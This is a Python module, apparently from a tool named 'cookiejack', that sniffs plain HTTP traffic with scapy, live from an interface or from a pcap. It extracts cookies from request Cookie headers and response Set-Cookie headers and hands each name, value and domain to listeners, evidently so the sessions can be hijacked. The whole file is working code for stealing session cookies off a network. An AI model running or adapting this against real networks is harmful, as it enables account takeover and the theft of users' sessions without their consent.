from http.cookies import SimpleCookie
from scapy.all import sniff, TCP
from scapy.layers.http import HTTPRequest, HTTPResponse
from cookiejack.data.cookie import Cookie as CookieData


class Cookies(object):
    def __init__(self, listeners, filter_string="tcp port http", pcap=None, interface=None, default_expiry=None):
        self.filter_string = filter_string
        self.listeners = listeners
        self.pcap = pcap
        self.interface = interface
        self.default_expiry = default_expiry

    def sniff(self):
        sniffkw = {
            "prn": self.extract,
            "filter": self.filter_string
        }

        if self.pcap:
            sniffkw["offline"] = self.pcap
        elif self.interface:
            sniffkw["iface"] = self.interface

        sniff(**sniffkw)

    def extract(self, pkt):
        cookie = False
        host = None

        if pkt.haslayer(TCP):
            if pkt.haslayer(HTTPRequest):
                http_request = pkt[HTTPRequest]

                if http_request.Cookie:
                    cookie = http_request.Cookie.decode()
                    host = http_request.Host.decode()

            if pkt.haslayer(HTTPResponse):
                http_response = pkt[HTTPResponse]

                if http_response.Set_Cookie:
                    cookie = http_response.Set_Cookie.decode()

            if cookie:
                self.process_cookie(cookie, host)

    def process_cookie(self, cookie : str, host: str):
        parsed = SimpleCookie(str(cookie))

        for k,v in parsed.items():
            host = v['domain'] if v['domain'] else host
            host = host[1:] if host[0] == "." else host 
            value = v.value

            self.send_cookie_to_listeners(
                    CookieData(
                        name=k, 
                        value=value, 
                        domain="." + host, 
                        url=f"://{host}", 
                        expiry=self.default_expiry
                    ))

    def send_cookie_to_listeners(self, cookie: CookieData):
        if self.listeners:
            for listener in self.listeners:
                listener.notify(cookie)
